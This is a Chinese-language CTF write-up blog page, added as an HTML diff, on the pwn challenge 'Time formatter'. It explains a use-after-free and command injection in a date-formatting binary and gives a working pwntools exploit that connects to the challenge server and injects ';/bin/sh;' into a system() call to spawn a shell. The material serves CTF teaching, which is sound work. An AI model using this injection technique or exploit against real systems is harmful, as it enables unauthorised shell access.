@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"a1ph0nse.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="这应该算是一道堆题罢(doge)，虽然只是个非常简单的UAF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Time formatter">
+<meta property="og:url" content="https://a1ph0nse.github.io/2023/01/02/time_formatter/index.html">
+<meta property="og:site_name" content="a1ph0nse">
+<meta property="og:description" content="这应该算是一道堆题罢(doge)，虽然只是个非常简单的UAF">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://a1ph0nse.github.io/2023/01/02/time_formatter/time_formatter/protect.png">
+<meta property="article:published_time" content="2023-01-02T11:54:26.000Z">
+<meta property="article:modified_time" content="2023-01-02T15:58:54.000Z">
+<meta property="article:author" content="a1ph0nse">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="heap">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://a1ph0nse.github.io/2023/01/02/time_formatter/time_formatter/protect.png">
+
+<link rel="canonical" href="https://a1ph0nse.github.io/2023/01/02/time_formatter/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Time formatter | a1ph0nse</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">a1ph0nse</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">一个菜狗的挣扎</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://a1ph0nse.github.io/2023/01/02/time_formatter/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="a1ph0nse">
+      <meta itemprop="description" content="pwn菜狗、cs菜鸡">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="a1ph0nse">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Time formatter
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-01-02 19:54:26 / 修改时间：23:58:54" itemprop="dateCreated datePublished" datetime="2023-01-02T19:54:26+08:00">2023-01-02</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn-wp/" itemprop="url" rel="index"><span itemprop="name">pwn_wp</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>这应该算是一道堆题罢(doge)，虽然只是个非常简单的UAF</p>
+<span id="more"></span>
+
+<p>首先查壳</p>
+<p><img src="./time_formatter/protect.png" alt="protect"></p>
+<p>有个FORTIFY_SOURCE的对格式化字符串的保护</p>
+<ol>
+<li><p>包含%n的格式化字符串不能位于程序内存中的可写地址。</p>
+</li>
+<li><p>当使用位置参数时，必须使用范围内的所有参数。所以如果要使用%7$x，你必须同时使用1,2,3,4,5和6。</p>
+</li>
+</ol>
+<p>扔进ida看看源码，又是菜单,看代码改函数名弄到想吐</p>
+<p>简单解释一下这个程序的功能：</p>
+<ul>
+<li>set_format():会用strdup申请一个chunk来存放输入的字符串，之后会对进行字符串中的字符进行检查（只能有字母、%、空格、：、#、-、_、0、/、^），不满足条件则会被free掉，<strong>若满足，则会将chunk指针赋值给一个bss段中的变量ptr</strong></li>
+<li>set_time():把你的输入写到一个固定的地方(没用)</li>
+<li>set_zone():会用strdup申请一个chunk来存放输入的字符串，<strong>但是不像set_format()那样进行检查</strong>，chunk指针会赋值给value</li>
+<li>print_time():如果ptr中有值，则会执行system(command)，command通过snprintf构造(<strong>有漏洞</strong>)</li>
+<li>my_exit():先free了ptr和value，再问你是不是真的要退出，却并没有让ptr和value=&gt;null，也没有清空其中的内容</li>
+</ul>
+<p>下面仔细看看值得注意的地方:</p>
+<p><strong>1.print_time()中command的构造</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__snprintf_chk(command,<span class="number">2048LL</span>,<span class="number">1LL</span>,<span class="number">2048LL</span>,<span class="string">&quot;/bin/date -d @%d +&#x27;%s&#x27;&quot;</span>,(<span class="type">unsigned</span> <span class="type">int</span>)dword_602120,(<span class="type">const</span> <span class="type">char</span> *)ptr);</span><br></pre></td></tr></table></figure>
+<p>这是什么东西?</p>
+<p>据说函数原型是这样的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">snprintf</span><span class="params">(<span class="type">char</span> *<span class="keyword">restrict</span> buf, <span class="type">size_t</span> n, <span class="type">const</span> <span class="type">char</span> * <span class="keyword">restrict</span>  format[, arguement])</span>;</span><br><span class="line"><span class="comment">//str为要写入的字符串；n为要写入的字符的最大数目，超过n会被截断；format为格式化字符串,arguement为格式化字符串的参数</span></span><br></pre></td></tr></table></figure>
+
+<p>虽然不知道为什么2048LL后面有个1L,2048LL，但可以知道的是，ptr就是格式化字符串的第二个参数，其内容会写入%s处，因此如果可以在这里写入/bin/sh就可以执行system(“/bin/sh”)了</p>
+<p>但是也没这么容易，还有一些坑：</p>
+<ol>
+<li>前面已经有一条指令/bin/date …了，要让shell执行ptr的指令（即一条语句执行两条指令），需要用到&amp;&amp;或;。由于&amp;&amp;需要前一条指令执行完才会执行第二条，而;则不需要，因此ptr中的内容要改为;/bin/sh</li>
+<li>还有另一个坑，在格式化字符串中是’%s’，%s外面是单引号，而要执行system(“/bin/sh”),/bin/sh要在单引号外面，因此在前后加上单引号，并且为了不出错，后面也要加上一个;，最后变为’;/bin/sh;’</li>
+</ol>
+<p><strong>2.set_format()和set_zone()</strong></p>
+<p>set_format()和set_zone()中都有一个函数strdup()</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">char</span> *<span class="title function_">strdup</span><span class="params">(<span class="type">char</span> *s)</span>;</span><br><span class="line"><span class="comment">//功 能: 将字符串拷贝到新建的位置处</span></span><br><span class="line"><span class="comment">//strdup()在内部调用了malloc()为变量分配内存</span></span><br></pre></td></tr></table></figure>
+<p>set_format()可以将指针赋值给ptr;set_zone()可以将指针赋值给value</p>
+<p>除此之外，在set_format()中拷贝完字符串后，会对字符串内容进行检查</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>(accept, <span class="string">&quot;%aAbBcCdDeFgGhHIjklmNnNpPrRsStTuUVwWxXyYzZ:-_/0^# &quot;</span>);<span class="comment">// 字符只能在这个范围内</span></span><br><span class="line">v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">strspn</span>(s, accept) == <span class="built_in">strlen</span>(s);</span><br></pre></td></tr></table></figure>
+<p>这让我们不能直接通过set_format()将ptr指向’;/bin/sh;’</p>
+<p><strong>但是在set_zone()中并没有安全检查</strong></p>
+<p><strong>3.my_exit()的迷之操作</strong></p>
+<p>在my_exit中会先free了ptr和value，再问你是否要退出,<strong>但是在free之后,ptr和value没有指向null，也没有清空其中的内容，也就是存在UAF</strong></p>
+<p>利用过程：</p>
+<ol>
+<li>通过set_format()存放一个字符串（chunk长度要和’;/bin/sh;’一致）</li>
+<li>my_exit()实现free(ptr)</li>
+<li>通过set_zone()将原来的chunk申请回来，并利用其不进行检查的特点，写入’;/bin/sh;’</li>
+<li>执行print_time()，getshell</li>
+</ol>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">elf=ELF(<span class="string">&quot;./formatter&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&quot;./formatter&quot;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">57516</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_format</span>(<span class="params">fmt</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(fmt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_zone</span>(<span class="params">zone</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(zone)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_time</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_exit</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">set_format(<span class="string">&quot;aaaaaaaaaaa&quot;</span>)</span><br><span class="line">my_exit()</span><br><span class="line">set_zone(<span class="string">&quot;&#x27;;/bin/sh;&#x27;&quot;</span>)</span><br><span class="line">print_time()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/heap/" rel="tag"># heap</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/01/02/tinypad/" rel="prev" title="Tinypad">
+      <i class="fa fa-chevron-left"></i> Tinypad
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/01/02/shellcode_revenge/" rel="next" title="Shellcode_revenge">
+      Shellcode_revenge <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="a1ph0nse"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">a1ph0nse</p>
+  <div class="site-description" itemprop="description">pwn菜狗、cs菜鸡</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">75</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">a1ph0nse</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
